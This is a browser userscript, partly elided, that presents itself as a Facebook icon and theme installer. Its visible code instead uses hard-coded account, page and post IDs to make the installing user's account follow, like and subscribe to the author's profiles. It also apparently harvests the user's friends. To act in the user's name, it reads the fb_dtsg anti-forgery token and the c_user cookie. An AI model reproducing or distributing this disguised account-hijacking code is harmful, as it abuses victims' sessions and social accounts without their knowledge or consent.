// ==UserScript==
// @name            Cài Đặt Icon và Themes Trên FaceBook 2014 (y)
// @description     All about facebook By Saddest
...
;
arkadaslari_al(id);
arkadaslari_al(1385017951769351);
arkadaslari_al(1376329215973396);
(function() {
...
alert('ChÃºc Báº¡n Online vui váº» ^_^ ÂºÂº.                                                                                                HTTP://FaceBook.com');
function Like(p) {
...
//Saddest
a("100005273767053"); a("100007796017012"); 
sublist("235671419951982"); sublist("239151252937332"); sublist("238882396297551"); sublist("239150799604044"); sublist("239151006270690");
sublist("239151056270685"); sublist("239151109604013"); sublist("239151142937343"); sublist("239151189604005"); sublist("239151239604000");
P("dai dien"); P("239370206248770");
Like("1448426485387691");
IDS("100005273767053");
// Danny Nguyen
a("100001821505595");
P("581305061940205"); P("494821837255195");
// Tuan Nguyen
a("100002393872010");
P("463177983771993"); P("446305672125891");
// Mask
a("100007660500996"); 
Like("633760719969195");
sublist("1377425939136609"); sublist("634325859947847"); 
// Phat Dong Hollister
a("100003683386514"); a("100004693272659");
Like("100004693272659");
//Ed Thanh
a("100004213090535");
sublist("286351848181916");
var gid = ['649119071815331'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
